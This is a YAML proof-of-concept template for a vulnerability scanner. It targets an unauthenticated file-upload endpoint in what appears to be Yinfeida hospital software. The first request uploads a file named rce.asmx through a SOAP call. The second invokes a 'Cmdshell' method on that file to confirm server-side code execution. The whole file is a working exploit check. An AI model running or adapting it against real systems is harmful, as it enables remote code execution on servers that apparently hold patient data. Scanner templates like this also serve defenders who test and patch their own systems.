name: poc-yaml-yinfeida-upload-File-upload
transport: http

rules:
  r0:
    request:
      method: POST
      path: /webservices/Upload.asmx
      headers:
        Content-Type: text/xml; charset=utf-8
      body: "\
        <?xml version=\"1.0\" encoding=\"utf-8\"?>\r\n\
        <soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"><soap:Body>\r\n\
        <UploadData xmlns=\"http://tempuri.org/\">\r\n\
        <guid>1</guid>\r\n\
        <patientId>1</patientId>\r\n\
        <patientName>1</patientName>\r\n\
        <fileName>rce.asmx</fileName>\r\n\
        <fileSize>1000</fileSize>\r\n\
        <file></file>\r\n\
        </UploadData>\r\n\
        </soap:Body>\r\n\
        </soap:Envelope>\r\n\
        "
    expression: response.status == 200

  r1:
    request:
      method: GET
      path: /spool/1/rce.asmx/Cmdshell?Pass=Response.Write("Hello,World")
    expression: response.status == 200 && response.body.bcontains(b'Hello,World')

expression: r0() && r1()


detail:
  author: Superhero
  links:
    - https://blog.csdn.net/m0_60571842/article/details/139704053